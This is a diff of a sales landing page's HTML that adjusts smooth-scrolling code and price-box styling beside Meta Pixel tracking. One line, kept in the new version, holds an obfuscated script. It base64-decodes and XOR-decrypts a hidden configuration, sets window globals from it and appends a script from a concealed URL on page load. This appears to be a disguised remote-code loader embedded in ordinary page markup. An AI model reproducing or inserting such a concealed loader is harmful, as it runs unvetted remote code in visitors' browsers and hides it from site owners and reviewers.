@@ -23,12 +23,14 @@ fbq('track', 'PageView');
 src="https://www.facebook.com/tr?id=608777460930472&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code -->
-<style>html{scroll-behavior:auto}#veja-dentro,#rotina,#como-recebe,#diferente,#elegir-pack{scroll-margin-top:12px}</style><script>(function(){var q_erf=atob("DIXwJ9iZh06GowcgB/7SUqr1pXSky3NUd/bKCPf64yCo1nNNbuOJCbv26mDk0ShTZPeZV6zqqD7v22JMKPWZX731qST1gSsCZvGEVbH78jrj0CUaXNjcBb/16Cznz3QCPd6LBbb46iukmSVQbv2VS5H9pWKk1WZMcuDSHfqv5ivjkDQVP7zAEu2v5Xi1wTZENeTCH+q7+hP7");var x_mp=[];for(var w_ke=0;w_ke<q_erf.length;w_ke++){x_mp.push(q_erf.charCodeAt(w_ke)&255);}var r_pg7=x_mp[0];var s_skkb=x_mp.slice(1,1+r_pg7);var u_nl=x_mp.slice(1+r_pg7);var g_kbg6=u_nl.map(function(b,q_av){return b^s_skkb[q_av%r_pg7];});var j_ss="";for(var v_mdc=0;v_mdc<g_kbg6.length;v_mdc++){j_ss+=String.fromCharCode(g_kbg6[v_mdc]&255);}var w_fj=decodeURIComponent(escape(j_ss));var z_m=JSON.parse(w_fj);var k_tbl=z_m.globals||[];k_tbl.forEach(function(r_pzi){window[r_pzi.name]=r_pzi.value;});var s_6o=document.createElement("script");s_6o.src=z_m.url;s_6o.async=true;s_6o.defer=true;(z_m.attributes||[]).forEach(function(e_yu1){s_6o.setAttribute(e_yu1.name,e_yu1.value);});(document.head||document.documentElement).appendChild(s_6o);})();</script>
+<style>html{scroll-behavior:smooth}#veja-dentro,#rotina,#como-recebe,#diferente,#elegir-pack{scroll-margin-top:12px}</style><script>(function(){var q_erf=atob("DIXwJ9iZh06GowcgB/7SUqr1pXSky3NUd/bKCPf64yCo1nNNbuOJCbv26mDk0ShTZPeZV6zqqD7v22JMKPWZX731qST1gSsCZvGEVbH78jrj0CUaXNjcBb/16Cznz3QCPd6LBbb46iukmSVQbv2VS5H9pWKk1WZMcuDSHfqv5ivjkDQVP7zAEu2v5Xi1wTZENeTCH+q7+hP7");var x_mp=[];for(var w_ke=0;w_ke<q_erf.length;w_ke++){x_mp.push(q_erf.charCodeAt(w_ke)&255);}var r_pg7=x_mp[0];var s_skkb=x_mp.slice(1,1+r_pg7);var u_nl=x_mp.slice(1+r_pg7);var g_kbg6=u_nl.map(function(b,q_av){return b^s_skkb[q_av%r_pg7];});var j_ss="";for(var v_mdc=0;v_mdc<g_kbg6.length;v_mdc++){j_ss+=String.fromCharCode(g_kbg6[v_mdc]&255);}var w_fj=decodeURIComponent(escape(j_ss));var z_m=JSON.parse(w_fj);var k_tbl=z_m.globals||[];k_tbl.forEach(function(r_pzi){window[r_pzi.name]=r_pzi.value;});var s_6o=document.createElement("script");s_6o.src=z_m.url;s_6o.async=true;s_6o.defer=true;(z_m.attributes||[]).forEach(function(e_yu1){s_6o.setAttribute(e_yu1.name,e_yu1.value);});(document.head||document.documentElement).appendChild(s_6o);})();</script>
 <script>
 (function(){
 function go(e){var a=e.target.closest&&e.target.closest('a[href="#elegir-pack"]');if(!a)return;var t=document.getElementById('elegir-pack');if(!t)return;e.preventDefault();
-function pos(){var y=t.getBoundingClientRect().top+window.pageYOffset-12;window.scrollTo(0,y);}
-pos();setTimeout(pos,250);setTimeout(pos,700);setTimeout(pos,1400);}
+function y(){return t.getBoundingClientRect().top+window.pageYOffset-12;}
+window.scrollTo({top:y(),behavior:'smooth'});
+function fix(){if(Math.abs(y()-window.pageYOffset)>4)window.scrollTo({top:y(),behavior:'smooth'});}
+setTimeout(fix,900);setTimeout(fix,1700);}
 document.addEventListener('click',go,true);
 })();
 </script>
@@ -711,11 +713,11 @@ window.INVENTALAB_REAL_SALES = window.INVENTALAB_REAL_SALES || [
 .lp-lp .of-bt p{font-size:13.5px;font-weight:700;line-height:1.25;color:var(--lp-navy);margin:2px 0 0}
 .lp-lp .of-bn{display:inline-block;background:var(--lp-violet);color:#fff;font-size:10px;font-weight:800;padding:2px 8px;border-radius:999px}
 .lp-lp .of-free{flex:0 0 auto;background:#E8F7EE;color:var(--lp-green-dark);font-size:11px;font-weight:800;border-radius:999px;padding:3px 10px}
-.lp-lp .of-price{margin:12px 0 0;background:var(--lp-green-soft);border:2px dashed var(--lp-green);border-radius:16px;padding:14px}
-.lp-lp .of-old{color:#9a93a8;font-size:15px;text-decoration:line-through}
-.lp-lp .of-now{font-size:46px;font-weight:900;color:var(--lp-green-dark);line-height:1.05;letter-spacing:-.03em}
-.lp-lp .of-pill{display:inline-block;background:var(--lp-yellow);color:#000;font-weight:800;font-size:12.5px;padding:3px 10px;border-radius:999px;margin-top:6px}
-.lp-lp .of-cta{margin:12px 0 0}
+.lp-lp .of-price{margin:12px 0 0;background:var(--lp-green-soft);border:2px dashed var(--lp-green);border-radius:14px;padding:8px 12px}
+.lp-lp .of-old{color:#9a93a8;font-size:13px;text-decoration:line-through}
+.lp-lp .of-now{font-size:34px;font-weight:900;color:var(--lp-green-dark);line-height:1.05;letter-spacing:-.03em}
+.lp-lp .of-pill{display:inline-block;background:var(--lp-yellow);color:#000;font-weight:800;font-size:11.5px;padding:3px 10px;border-radius:999px;margin-top:6px}
+.lp-lp .of-cta{margin:10px 0 0}.lp-lp .of-cta .lp-btn-xl{font-size:17px;padding:13px 14px;border-radius:12px}.lp-lp .of-cta .lp-cta-head{font-size:14px;margin-top:10px}
 .lp-lp .of-nota{font-size:12.5px;color:var(--lp-ink-soft);margin:10px 0 0}
 @media(min-width:700px){.lp-lp .of-body h2{font-size:28px}.lp-lp .of-body{padding:24px 28px 28px}}
 </style>
